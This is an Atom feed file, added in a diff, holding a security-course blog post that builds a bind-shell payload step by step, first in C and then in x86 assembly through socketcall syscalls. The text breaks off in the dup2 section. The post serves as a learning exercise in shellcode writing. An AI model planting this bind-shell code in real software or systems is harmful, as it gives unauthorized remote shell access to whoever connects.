@@ -1,0 +1,450 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.1.6">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2017-03-27T17:54:15+00:00</updated><id>/</id><title>rtmcx</title><subtitle>Describe your website here.</subtitle><entry><title>SLAE Assignment 1</title><link href="/SLAE-Assignment-1/" rel="alternate" type="text/html" title="SLAE Assignment 1" /><published>2017-03-23T00:00:00+00:00</published><updated>2017-03-23T00:00:00+00:00</updated><id>/SLAE-Assignment-1</id><content type="html" xml:base="/SLAE-Assignment-1/">&lt;h1 id=&quot;slae-assignment-1&quot;&gt;SLAE Assignment #1&lt;/h1&gt;
+
+&lt;p&gt;##Requirements&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a Shell_Bind_TCP  shellcode
+    &lt;ul&gt;
+      &lt;li&gt;Binds to a port&lt;/li&gt;
+      &lt;li&gt;Execs Shell on incoming connection&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Port number should be easily conﬁgurable&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To better understand the task ahead and which components that are needed, I wrote a small program in C.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;netinet/in.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define SRVPORT 5555
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// Address information for server and client
+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;// sockaddr_in is found in &#39;netinet/in.h&#39;
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Create a TCP socket, of type stream and protocol IP.
+&lt;/span&gt;        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Set up the values for the &#39;Bind&#39;-function   
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;host_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// 2 = Address family, INET TCP 
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;host_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SRVPORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;// Portnum, Network byte order 
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;host_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;htonl&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;// 0 = Bind to any IP
+&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// Bind the socket to the host
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Start to listen on the socket..
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Accept incomming request
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sin_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// Duplicate the socket to stdin, stdout, stderr
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clientfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// And run the shell
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Inspiration taken from “Hacking: The Art of Exploitation” by Jon Erickson and http://www.umiacs.com/&lt;/p&gt;
+
+&lt;p&gt;Ok, so we have a “template” program to start mapping and converting to asm.
+The tasks we need to perfom are:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Create a socket&lt;/li&gt;
+  &lt;li&gt;Bind&lt;/li&gt;
+  &lt;li&gt;Listen&lt;/li&gt;
+  &lt;li&gt;Accept connection&lt;/li&gt;
+  &lt;li&gt;Copy fd to stdio, stdout, stderr&lt;/li&gt;
+  &lt;li&gt;Execve&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;So the first function to invoke is the socket()-function.&lt;/p&gt;
+
+&lt;p&gt;We start by looking up the syscall responsible for the socket creation. 
+It turns out that all the socket handling is done by the syscall “socketcall”, which has syscall number 102 (or 0x66).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rtmcx@parrot &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
+&lt;span class=&quot;c&quot;&gt;#define __NR_socketcall 102&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#define __NR_socket 359&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#define __NR_socketpair 360&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;“man socketcall” give the following function declaration:&lt;/p&gt;
+
+&lt;p&gt;; int socketcall(int call, unsigned long *args);&lt;/p&gt;
+
+&lt;p&gt;So, to execute a socket-funktion, we need to set up the syscall and pass which socket-function to execute, and a array with the arguments to that function.&lt;/p&gt;
+
+&lt;p&gt;We find the function numbers in the “net” header file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rtmcx@parrot &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /usr/include/linux/net.h | grep &lt;span class=&quot;s1&quot;&gt;&#39;sys_socket(2)&#39;&lt;/span&gt; -A5
+&lt;span class=&quot;c&quot;&gt;#define SYS_SOCKET  1       /* sys_socket(2)        */&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#define SYS_BIND    2       /* sys_bind(2)          */&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#define SYS_CONNECT 3       /* sys_connect(2)       */&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#define SYS_LISTEN  4       /* sys_listen(2)        */&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#define SYS_ACCEPT  5       /* sys_accept(2)        */&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;socket&quot;&gt;Socket&lt;/h2&gt;
+&lt;p&gt;So to successfully execute a socket-function call we must set up the registers as the following example:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; Syscall number for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; The socket function to execute (1 = socket) &lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; The address to an array of arguments to the function&lt;/span&gt;
+                    &lt;span class=&quot;c&quot;&gt;; (here we prentend that we have that address stored in esp)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Make the syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We use the stack for setting up the arguments for the function. 
+We push the values to the stack, in reverse order, and moves the esp pointer to ecx and then make the syscall.&lt;/p&gt;
+
+&lt;p&gt;Like so:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;; Create a socket using socketcall&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; sockfd = socket(int socket_family, int socket_type, int protocol);&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; PUSH protocol, type and domain&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Make edi null&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Protocol&#39;, TCP = 0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; &#39;Type&#39;, SOCK_STREAM = 1&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; &#39;Domain&#39;, INET = 2.&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to args in ecx (this is the args to socketcall)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;ecx now contains the args-array needed for ‘Socket’-to be called successfully.&lt;/p&gt;
+
+&lt;p&gt;The socket descriptor is then returned in eax, so that we can save and reference it later.&lt;/p&gt;
+
+&lt;h2 id=&quot;bind&quot;&gt;Bind&lt;/h2&gt;
+&lt;p&gt;Next call needed is the ‘Bind’-call.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;c&quot;&gt;; BIND&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Set up args for &#39;Bind&#39;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/span&gt;
+    
+    &lt;span class=&quot;c&quot;&gt;; ebx = socketfd (esi)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; ecx = args for bind (struct sockaddr) &lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; edx length of the args&lt;/span&gt;
+    
+    &lt;span class=&quot;c&quot;&gt;; Setup the sockaddr, push the values to the stack&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; sockaddr (2, 9999, 0)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; edi is still 0    (ADDR_FAMILY ALL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0f27&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; Port 9999 in hex network byte order ()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; (AF_INET)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to args in ecx, for use with &quot;bind&quot; call  &lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; inc ebx to 2, for &#39;Bind&#39;-socketcall number&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;; Size of the sockaddr struct (16 bytes)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Argv for bind&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; esi has the socketfd in it&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to &#39;Bind&#39;-args in ecx&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; zero out eax &lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;listen&quot;&gt;Listen&lt;/h2&gt;
+&lt;p&gt;Next call needed is the ‘Listen’-call.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;; LISTEN&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Setup args for &#39;Listen&#39; &lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; listen(socketfd, backlog)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Make eax null&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; push 0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; esi has the socketfd in it &lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Put pointer to &#39;Listen&#39;-args&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; Syscall for listen&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;accept&quot;&gt;Accept&lt;/h2&gt;
+&lt;p&gt;Next call needed is the ‘Accept’-call.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c&quot;&gt;; ACCEPT&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Setup args for &#39;Accept&#39;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; accept( socketfd, struct sockaddr, sizeof sockaddr)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Since we know nothing of the client, sockaddr and it&#39;s size is set to 0   &lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; edi is still 0 (ADDR_FAMILY ALL)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; &lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; esi has the socketfd in it &lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; struct for sockaddr (client)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;; ebx has 4 since &#39;listen&#39; call. Inc to make 5 for accept&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; syscall for socketcall&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;; Execute syscall&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;## dup2
+Next we need to perform the “dup2”-syscall to redirect the incoming traffic to stdin, stdout and stderr.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;; DUP2&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; Now we need to dup2 i/o-to client socketfd&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;; dup2(oldfd, newfd)&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; put client socketfd (returned in eax) to ebx&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; make eax zero&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; Zero out ecx&lt;/span&gt;
